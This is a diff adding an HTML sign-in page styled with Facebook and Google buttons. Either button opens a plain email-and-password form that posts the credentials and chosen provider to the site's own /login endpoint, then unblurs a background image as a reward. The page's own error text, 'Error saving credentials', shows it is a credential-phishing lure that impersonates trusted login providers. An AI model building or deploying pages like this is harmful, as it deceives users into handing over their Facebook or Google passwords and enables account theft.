@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4;
+            overflow: hidden;
+        }
+
+        .background-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .background-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: blur(10px);
+            transition: filter 0.5s ease;
+            pointer-events: none;
+        }
+
+        .signin-container {
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .signin-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 250px;
+            height: 50px;
+            margin: 10px 0;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .facebook-btn {
+            background-color: #3b5998;
+        }
+
+        .google-btn {
+            background-color: #4285f4;
+            color: white;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.2);
+        }
+
+        .signin-button img {
+            margin-right: 10px;
+            width: 24px;
+            height: 24px;
+        }
+
+        .google-btn img {
+            margin-right: 10px;
+            margin-left: -10px;
+            background-color: white;
+            padding: 8px;
+            border-radius: 3px;
+        }
+
+        .login-panel {
+            display: none;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+
+        .login-panel input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .login-panel button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background-color: #4285f4;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .login-panel button:hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-container">
+        <img src="https://d-art.ppstatic.pl/kadry/k/r/1/52/55/5cb5b89dcd79c_o_large.jpg" alt="Background Image">
+    </div>
+
+    <div class="signin-container" id="signinContainer">
+        <h2>Sign In</h2>
+        <a href="#" id="facebookBtn" class="signin-button facebook-btn" onclick="showLoginPanel('Facebook')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            Login with Facebook
+        </a>
+        <a href="#" id="googleBtn" class="signin-button google-btn" onclick="showLoginPanel('Google')">
+            <img src="https://user-images.githubusercontent.com/1770056/58111071-c2941c80-7bbe-11e9-8cac-1c3202dffb26.png" alt="Google Logo">
+            Sign up with Google
+        </a>
+
+        <!-- Hidden Login Panel -->
+        <div id="loginPanel" class="login-panel">
+            <h3 id="loginTitle">Login</h3>
+            <form id="loginForm" method="POST">
+                <input type="text" placeholder="Email or Username" id="email" name="email" required>
+                <input type="password" placeholder="Password" id="password" name="password" required>
+                <input type="hidden" id="provider" name="provider">
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showLoginPanel(platform) {
+            const loginPanel = document.getElementById('loginPanel');
+            const loginTitle = document.getElementById('loginTitle');
+            const providerInput = document.getElementById('provider');
+            const facebookBtn = document.getElementById('facebookBtn');
+            const googleBtn = document.getElementById('googleBtn');
+
+            // Hide the buttons
+            facebookBtn.style.display = 'none';
+            googleBtn.style.display = 'none';
+
+            // Show the login panel
+            loginPanel.style.display = 'block';
+            loginTitle.textContent = `Login with ${platform}`;
+            providerInput.value = platform;
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(event.target);
+            fetch('/login', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'success') {
+                      // Remove blur filter from the image background
+                      document.querySelector('.background-container img').style.filter = 'none';
+                      document.querySelector('.background-container img').style.pointerEvents = 'auto';
+
+                      // Hide the sign-in container
+                      document.getElementById('signinContainer').style.display = 'none';
+                  } else {
+                      alert('Error saving credentials.');
+                  }
+              });
+        });
+    </script>
+</body>
+</html>
